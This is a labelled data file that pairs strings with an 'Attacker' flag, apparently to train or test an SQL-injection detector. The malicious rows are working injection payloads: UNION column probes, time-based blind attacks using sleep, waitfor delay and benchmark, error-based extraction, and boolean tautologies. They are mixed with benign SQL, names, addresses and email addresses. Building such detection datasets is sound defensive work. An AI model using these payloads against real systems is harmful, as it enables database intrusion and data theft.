Payload	Attacker
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""bqfj"" like ""bqfj"	1
SELECT children ( s ) FROM school INNER JOIN	0
"1%""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""%""  =  """	1
SELECT century ( s )  FROM adventure	0
cuesta de la baronesa, 192	0
SELECT * FROM couple WHERE herself  BETWEEN 10 AND 20	0
carrera 55,	0
SELECT * FROM rain FETCH FIRST 50 PERCENT ROWS ONLY	0
1%'  )   union all select null,null,null,null--	1
-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--	1
c/ antonia lancha, 38, 1?h	0
calle arriola 29,	0
SELECT * FROM dark WHERE physical BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT * FROM more WHERE discover = 'part'  OR cent = 'silent'	0
c/ el columpio 13,	0
SELECT AVG ( exclaimed ) FROM doing SELECT SUM ( planet ) 	0
-2601'  )   union all select 2866,2866,2866,2866,2866,2866--	1
SELECT TOP 3 * FROM themselves WHERE principal = 'art' SELECT * FROM across	0
thiel	0
l1am217r5	0
SELECT greatest ( s )  FROM felt SELECT written FROM acres	0
4e6qu5r5r	0
1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--	1
50236	0
1.0841E+015	0
SELECT TOP 3 * FROM complex	0
SELECT * FROM touch 3 SELECT * FROM military	0
SELECT COUNT ( cold )  FROM frame	0
  SELECT suitID AS ID, nervous AS store FROM crop	0
  SELECT Orders.rootrID, Employees.symbol, Employees.fewer FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.contrastID ORDER BY Orders.shallID	0
SELECT * FROM collect WHERE newspaper BETWEEN '1996-07-01' AND '1996-07-31'	0
01633578a	0
1'   )    )    or sleep  (  5  )   and    (    (   'taaj'  =  'taaj	1
-2667  )   union all select 5848,5848,5848,5848--	1
calle conjunto avenida, 116	0
-4304' where 1005  =  1005 union all select 1005,1005#	1
SELECT * FROM mysterious WHERE silver BETWEEN part09/01/1996water AND build15/31/1996once	0
98946031p	0
albacete	0
-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--	1
if  (  7340  =  9813  )   select 7340 else drop function yppp--	1
1 waitfor delay '0:0:10'--	1
"-5231%"" or 4945  =  8402#"	1
SELECT * FROM instant WHERE forgotten LIKE '%third%'	0
SELECT * FROM join WHERE took LIKE '%close%'	0
"1""  )   as wsyv where 8142  =  8142 rlike sleep  (  5  )  #"	1
randera	0
"admin"" or ""1""  =  ""1"	1
"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt"	1
SELECT * FROM ten WHERE main NOT LIKE 'sets%'	0
SELECT * FROM gather WHERE watch BETWEEN '1996-07-01' AND '1996-07-31'	0
1'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'fzgy'  =  'fzgy	1
  UPDATE money SET biggest =  'section', City =  'fair' WHERE won =  model	0
1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'jiyx'  =  'jiyx	1
-4324 order by 1--	1
2210000000000000	0
"-1174"" union all select 4303,4303,4303,4303#"	1
 SELECT * FROM cookies ORDER BY cut ASC, great DESC	0
SELECT orbit ( s )  FROM east LEFT JOIN	0
1'  )   as pogx where 4105  =  4105 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --	1
SELECT nation FROM anywhere UNION ALL SELECT difficulty FROM easy ORDER BY common	0
select * from users where id  =  1 %  (  1  )   or 1  =  1 -- 1	1
"1""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""urgd""  =  ""urgd"	1
86943454g	0
"1""  )   where 2367  =  2367"	1
urea bernat	0
  SELECT adult AS blue, having AS [chose]  FROM off	0
39395797v	0
"1"" and elt  (  4249  =  4249,7259  )   and ""kgtz"" like ""kgtz"	1
64556150a	0
 select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1	1
SELECT TOP 3 * FROM rest WHERE halfway = 'couple' SELECT * FROM seldom	0
   SELECT longer, rocky, sweet FROM metal WHERE someone  IS NULL	0
1  )   and 2457  =  8146	1
SELECT AVG ( shelf ) FROM sister	0
tabar	0
SELECT * FROM including ORDER BY establish	0
brewer	0
SELECT airplane	0
1'  )   as rvli where 4427  =  4427	1
hacanea	0
1'||  (  select 'adoe' from dual where 7662  =  7662	1
10650	0
fluvia	0
 SELECT * FROM general ORDER BY clean ASC, supper DESC	0
//	1
  SELECT here AS morning, every AS [against]  FROM aboard	0
1'||  (  select 'ydvg' from dual where 7108  =  7108	1
segura reygadas	0
calvin@espaciodelpintor.by	0
"  SELECT LEAST ( ""w3Schools.com"", ""microsoft.com"", ""apple.com"" ) ;"	0
SELECT * FROM dog	0
"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""blkt"" like ""blkt"	1
-8054'   )    )    union all select 5232,5232,5232,5232,5232,5232,5232#	1
SELECT * FROM ever WHERE purple = 'probably'	0
1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #	1
-2111' union all select 1061,1061,1061--	1
-7199' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'qibr'  =  'qibr	1
jabbari	0
  SELECT pleasureID AS ID, color AS shelf FROM date	0
ansorger	0
SELECT AVG ( heat )  FROM on  SELECT SUM ( ancient ) 	0
aristin	0
INSERT INTO party ( effect, share, system, wet, east, blood )  VALUES  ( 'eaten', 'canal'. wood', 'agree', 'dirty', 'tent', 'drink' )  	0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 28313,28341 ) 	0
 select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1	1
SELECT * FROM sudden	0
gloria	0
SELECT * FROM keep  WHERE attached = gate	0
"1"" and make_set  (  8403  =  8403,8899  )   and ""bbgg""  =  ""bbgg"	1
1'   )    )    as cjjm where 1981  =  1981	1
-7746'  )   union all select 1998,1998,1998,1998,1998,1998,1998,1998#	1
 UPDATE hay SET age = 'speak'WHERE secret = 'cattle'	0
1' or sleep  (  5  )   and 'udqz'  =  'udqz	1
SELECT * FROM farther WHERE NOT determine = 'began'  AND NOT sink = 'fully'	0
SELECT * FROM lady FETCH FIRST 3 ROWS ONLY	0
1  )   where 2678  =  2678 union all select null,null,null,null,null,null,null,null,null#	1
SELECT * FROM chamber WHERE discovery = 'short' LIMIT 3	0
padr pavajeau	0
1%'  )   union all select null--	1
  SELECT battle,expect,none FROM stranger LEFT JOIN Orders ON substance.roarID =  time.special ORDER BY dead.mainly	0
SELECT * FROM bridge FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM disease	0
boquieni	0
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7711  =  7711	1
"-4596"" union all select 5761#"	1
03206041w	0
vilamartn de valdeorras	0
SELECT * FROM glad WHERE source = 'fairly'  OR widely = 'image'	0
   SELECT handsome, brain, breakfast FROM port WHERE rule  IS NULL	0
SELECT table ( s ) FROM minute INNER JOIN	0
29640	0
 SELECT * FROM force ORDER BY powerful, art	0
cister grandi	0
"1""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""yopd"" like ""yopd"	1
SELECT glass ( s )  FROM keep UNION	0
SELECT * FROM dirt WHERE steel  BETWEEN 10 AND 20	0
"1%"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
garcilln	0
"1"" where 2547  =  2547 or sleep  (  5  )  #"	1
SELECT column1 , column2, ... FROM table_name WHERE condition1 AND condition2 AND condition3 ... ;	0
select   (  case when   (  2140  =  5325  )   then 2140 else 2140*  (  select 2140 from information_schema.character_sets  )   end  )  #	1
1' where 1673  =  1673 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --	1
SELECT roll FROM exclaimed UNION ALL SELECT rabbit FROM struggle ORDER BY office	0
"1""   )    )    union all select null,null,null,null,null#"	1
1,  (  select   (  case when   (  8640  =  8640  )   then   (  ascii  (  regexp_substring  (  repeat  (  right  (  char  (  8640  )  ,0  )  ,500000000  )  ,null   )    )     )   else 8640/  (  select 0 from information_schema.system_users  )   end  )   from information_schema.system_users  )  --	1
1   )    )    union all select null,null,null,null,null,null,null,null,null--	1
SELECT * FROM build WHERE fed NOT LIKE '[happen]%'	0
SELECT * FROM single WHERE been BETWEEN average09/01/1996movie AND work15/31/1996radio	0
adaiana	0
SELECT * FROM worker WHERE heading = 'due' FETCH FIRST 3 ROWS ONLY	0
SELECT MIN ( sunlight )  AS region FROM four	0
""" or """"*"""	1
19219	0
1%'   )    )     )   union all select null,null,null--	1
fasti-dio	0
SELECT * FROM black ORDER BY seven	0
SELECT agree ( s )  FROM shoot SELECT magic FROM statement	0
3118	0
SELECT TOP 50 PERCENT * FROM piano	0
"SELECT WEEKDAY ( ""2017-01-01"" ) ;"	0
9043	0
"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--"	1
1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf	1
SELECT * FROM anyway WHERE master = 'title'	0
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'obwn'  =  'obwn	1
SELECT * FROM studied WHERE route NOT LIKE 'chose%'	0
1'   )    )    as clbc where 5649  =  5649	1
1  )   where 2223  =  2223	1
  SELECT thinkID AS ID, dry AS him FROM finally	0
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'fpaf'  =  'fpaf	1
90179643r	0
 SELECT * FROM this ORDER BY older ASC, clearly DESC	0
1' where 1692  =  1692	1
1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs	1
pedrosas, las	0
1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'pphf'  =  'pphf	1
  (  extractvalue  (  1759,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1759  =  1759,1   )    )     )  ,0x717a767a71   )    )     )  	1
1',  (  select   (  case when   (  3902  =  3902  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  	1
   SELECT diagram, early, curious FROM chemical WHERE huge  IS NULL	0
  SELECT PERIOD_DIFF ( 201710, 201703 ) ;	0
1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #	1
1'+  (  select 'qvif' where 1758  =  1758 union all select null,null,null,null,null,null,null,null#	1
SELECT TOP 3 * FROM bush WHERE themselves = 'declared' SELECT * FROM nation	0
1'  )   as uytv where 7875  =  7875 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
"1""   )    )    as qode where 2398  =  2398 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --"	1
SELECT region ( s )  FROM coffee UNION ALL	0
4u9_l5o	0
   SELECT road, favorite, badFROM victory WHERE cause  IS NOT NULL	0
SELECT * FROM sound WHERE stove = 'empty' LIMIT 3	0
  SELECT * FROM gun WHERE slave NOT IN  ( 'army', 'line', 'ground' )  	0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""vcup""  =  ""vcup"	1
SELECT were ( s ) FROM potatoes INNER JOIN	0
"-8203""  )   union all select 6394,6394,6394,6394,6394--"	1
17120	0
7841490000000000	0
SELECT * FROM wp_posts WHERE ID  =  28072 LIMIT 1	0
-3378'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'otbq'  =  'otbq	1
SELECT invented ( s )  FROM pool UNION	0
1' and non_existant_table   =   '1	1
besnehard8@itrends.tn	0
SELECT COUNT ( DISTINCT soldier )  FROM ourselves	0
1' union all select null--	1
4978850000000000	0
   SELECT aboard, cookies, feathers FROM instant WHERE wrote  IS NULL	0
SELECT * FROM model WHERE find LIKE '%cloth%'	0
calle ramon mario mirazo 46	0
SELECT * FROM want WHERE field LIKE '%farther%'	0
SELECT sink ( s )  FROM purpose SELECT easy ( s ) 	0
SELECT AVG ( yesterday ) FROM pool SELECT SUM ( father ) 	0
  SELECT * FROM body WHERE told IN  ( 'moving', 'rest', 'since' )  	0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""seci""  =  ""seci"	1
peral, 180 4-b	0
1'   )    )    as pgif where 6346  =  6346	1
Ã½ or 1  =  1 --	1
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'nlrk' like 'nlrk	1
SELECT TOP 3 * FROM through WHERE anyone = 'turn'	0
SELECT TOP 3 * FROM replied WHERE fill = 'ordinary'	0
SELECT * FROM part WHERE lying = 'walk'  OR horse = 'electric'	0
  SELECT * FROM measure WHERE accurate IN  ( 'observe', 'suggest', 'current' )  	0
villalobar de rioja	0
call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '	1
SELECT * FROM worry WHERE engine BETWEEN 'struggle' AND 'activity'	0
1%' and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
SELECT student FROM wore UNION SELECT sang FROM pour ORDER BY habit	0
29283698y	0
pozal de gallinas	0
SELECT * FROM paper FETCH FIRST 50 PERCENT ROWS ONLY	0
1  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  	1
c/ las niadas, 67 9?f	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 177 )  ORDER BY meta_id ASC	0
listeza	0
bertolda	0
SELECT support ( s )  FROM new FULL OUTER JOIN	0
1   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  1233  =  1233	1
1'   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
select count  (  *  )   from generate_series  (  1,5000000  )  	1
  SELECT strong,molecular FROM coat WHERE coach = 'industrial' UNION SELECT frighten, moving FROM usual	0
SELECT * FROM bone FETCH FIRST 3 ROWS ONLY	0
SELECT * FROM rope WHERE Price NOT BETWEEN 10 AND 20	0
SELECT AVG ( suddenly ) FROM start	0
1'   )    )    as hmyc where 6732  =  6732 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --	1
1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'hbwk' like 'hbwk	1
"1%""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """	1
 SELECT column_name ( s )  FROM vapor,name	0
p7g2na	0
SELECT * FROM company WHERE center  BETWEEN 10 AND 20	0
"1""   )    )    as xtlt where 9293  =  9293"	1
gribov-ridgeley@creacionwebs.lk	0
SELECT * FROM labor WHERE Price NOT BETWEEN 10 AND 20	0
SELECT planet FROM result	0
end and 'wdce'  =  'wdce	1
paratge lila 30, 10?c	0
SELECT * FROM in WHERE another BETWEEN '1996-07-01' AND '1996-07-31'	0
8l077ra	0
SELECT TOP 3 * FROM keep SELECT * FROM nearby 3SELECT * FROM improve	0
1'   )    )    as lizu where 7691  =  7691 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
-3535%'   )    )     )   or 5605  =  4660 and    (    (     (  '%'  =  '	1
44394	0
-4919  )   union all select 2608,2608,2608,2608,2608,2608#	1
riggsbee	0
lorber-albasiny@cortinasartesol.pa	0
supersticin	0
964	0
-6327'   )    )    union all select 2685--	1
neusy	0
1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'ohqs' like 'ohqs	1
SELECT * FROM cake 3	0
shrum@uniovivirtual.nz	0
SELECT * FROM agree WHERE    NOT labor = 'action'	0
SELECT * FROM ten FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM draw	0
SELECT * FROM art	0
espinoza@canariasatuaire.lb	0
sarri de ter	0
SELECT * FROM thou WHERE cost = 'missing'  AND City = 'compare'	0
1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'	1
SELECT * FROM any  WHERE may = building	0
SELECT TOP 3 * FROM whispered WHERE funny = 'map' SELECT * FROM draw	0
1  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  	1
basset ramos	0
komarov@docerosas.dk	0
-2743 union all select 6757,6757,6757,6757,6757,6757--	1
SELECT * FROM usually WHERE least = 'addition' FETCH FIRST 3 ROWS ONLY	0
8320000000000000	0
SELECT COUNT ( common ) FROM your	0
-8472'  )   where 3340  =  3340 or make_set  (  1752  =  9905,9905  )  --	1
SELECT * FROM level WHERE replace LIKE '%worry%'	0
SELECT * FROM south WHERE week BETWEEN nor09/01/1996apple AND growth15/31/1996thus	0
SELECT * FROM pot WHERE bring NOT BETWEEN 'crowd' AND 'dry'	0
1'+  (  select pxsd where 2576  =  2576 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'	1
-7600' or 7684  =  3181#	1
"1""  )   where 6065  =  6065 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"	1
5010630000000000	0
-3578'   )    )     )   order by 1--	1
"-4923"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""afjc"" like ""afjc"	1
  SELECT fox AS north, ahead AS [each]  FROM office	0
SELECT * FROM halfway WHERE NOT spell = 'vote'  AND NOT straight = 'ship'	0
1   )    )    union all select null,null,null,null#	1
1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- zimf	1
"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #"	1
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""%""  =  """	1
"1%""   )    )     )   and make_set  (  8191  =  7813,7813  )   and    (    (     (  ""%""  =  """	1
1'||  (  select 'allj' where 7334  =  7334	1
SELECT younger FROM interior UNION SELECT outside FROM past ORDER BY complex	0
kapp	0
1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  	1
SELECT * FROM not WHERE change BETWEEN '1996-07-01' AND '1996-07-31'	0
   SELECT pond,minerals,vowel,became,blew     (  (  usual JOIN note ON important.dollar =  around.problem )   INNER JOIN shareON Orders.point =  however.motherID ) 	0
   SELECT Orders.OrderID, Customers.CustomerName, Shippers.ShipperNameFROM     (  (  OrdersINNER JOIN Customers ON Orders.CustomerID  =  Customers.CustomerID )   INNER JOIN Shippers ON Orders.ShipperID  =  Shippers.ShipperID ) ;	0
"1%""   )    )    and sleep  (  5  )  #"	1
FROM  ( SELECT DISTINCT care FROM thy ) 	0
oliver@weat.gm	0
1'||  (  select 'fjlg' from dual where 9517  =  9517	1
manquel	0
SELECT * FROM laugh 3 SELECT * FROM means	0
SELECT TOP 50 PERCENT * FROM leaf SELECT * FROM store FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wife	0
-3125'   )    )     )   order by 1#	1
select count  (  *  )   from generate_series  (  1,5000000  )  #	1
1' rlike sleep  (  5  )  #	1
abuuelada	0
SELECT AVG ( either ) FROM usual SELECT SUM ( effect ) 	0
39654869v	0
"1""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""kssm""  =  ""kssm"	1
SELECT * FROM somewhere FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT TOP 3 * FROM major SELECT * FROM water 3SELECT * FROM card	0
"1%""   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """	1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'jirc'  =  'jirc	1
5n37do	0
-2983'  )   or 8571  =  8571--	1
l-9rn	0
-7720   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8254  =  8254	1
SELECT * FROM research WHERE when BETWEEN satellites09/01/1996crack AND mistake15/31/1996occur	0
SELECT COUNT ( sunlight ) FROM talk	0
porteril	0
-8812 or 6872  =  6872# dflr	1
 SELECT column_name ( s )  FROM laid,life	0
SELECT AVG ( Price ) FROM forward	0
select * from users where id  =  '1' or \<1 or 1  =  1 -- 1'	1
SELECT * FROM standard FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM seeing	0
kannel	0
SELECT * FROM  ( SELECT almost FROM rabbit ) 	0
INSERT INTO Customers  ( CustomerName, City, Country )  VALUES  ( 'Cardinal', 'Stavanger', 'Norway' ) ; 	0
"-6214"" union all select 3323,3323#"	1
0g83ma7ora	0
chimeneas	0
1   )    )    as fynx where 9636  =  9636 union all select null,null,null,null,null--	1
oviedo	0
wambsgan	0
